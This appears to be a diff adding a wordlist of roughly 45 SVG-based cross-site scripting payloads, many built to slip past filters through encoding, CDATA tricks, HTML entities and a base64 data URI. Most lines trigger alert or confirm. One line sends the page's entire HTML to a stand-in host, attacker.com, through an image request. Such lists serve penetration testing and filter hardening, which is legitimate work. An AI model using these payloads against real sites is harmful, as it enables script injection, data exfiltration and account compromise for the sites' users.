@@ -1,0 +1,55 @@
+<svgonload=alert(1)>
+<svg/onload=alert('XSS')>
+<svg onload=alert(1)//
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg id=alert(1) onload=eval(id)>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(/XSS/)
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
+<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
+-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
+<svg%0Ao%00nload=%09((pro\u006dpt))()//
+<svg><set onbegin=alert(1)>
+<svg><set end=1 onend=alert(1)>
+<svg><a><rect width=99% height=99% /><animate attributeName=hrefto=javascript:alert(1)>
+<svg><a><rect width=99% height=99% /><animate attributeName=hrefvalues=javascript:alert(1)>
+<svg><a><rect width=99% height=99% /><animate attributeName=href to=0from=javascript:alert(1)>
+<svg><use xlink:href=data:image/svg%2Bxml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI%2BPGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>
+<svg/on<script><script>load=alert(1)//</script>
+%u003Csvg onload=alert(1)>
+%u3008svg onload=alert(2)>
+%uFF1Csvg onload=alert(3)>
+"><svg/onload=alert(1)>"@x.y
+\74svg o\156load\75alert\501\51\76
+"'>confirm&lpar;1)</Script><Svg><Script/1='
+<!--><svg onload=alert(1)-->
+<svg id=<img/src/onerror&#61alert(1)&gt; onload=head.innerHTML=id>
+<svg id=<img/src/onerror&#61alert(1)&gt; onload=body.outerHTML=id>
+<svg/onload="(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML">
+veris-->group<svg/onload=alert(/XSS/)//
+<svg/onload=%26%23097lert%26lpar;1337)>
+<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
+<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
+</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
+<svg><script ?>alert(1)
+<svg contentScriptType=text/vbs><script>MsgBox
+<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
+<svg><script>//&NewLine;confirm(1);</script </svg>
+<svg contentScriptType=text/vbs><script>MsgBox+1
+<svg><script>//&NewLine;confirm(1);</script </svg>
+
+
+
+
+
+
+
+
+
+
+
